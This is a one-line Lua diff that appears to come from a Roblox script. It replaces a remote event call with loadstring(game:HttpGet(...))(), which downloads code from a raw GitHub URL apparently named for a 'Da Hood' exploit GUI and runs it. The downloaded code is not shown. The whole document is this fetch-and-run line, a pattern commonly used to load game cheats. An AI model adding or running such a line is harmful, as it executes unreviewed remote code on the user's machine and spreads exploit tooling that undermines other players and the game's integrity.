@@ -1,1 +1,1 @@
-game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime")
+loadstring(game:httpget('https://raw.githubusercontent.com/humiliatiion/Da-GUI/main/Dahood%20eva%20gui'))()
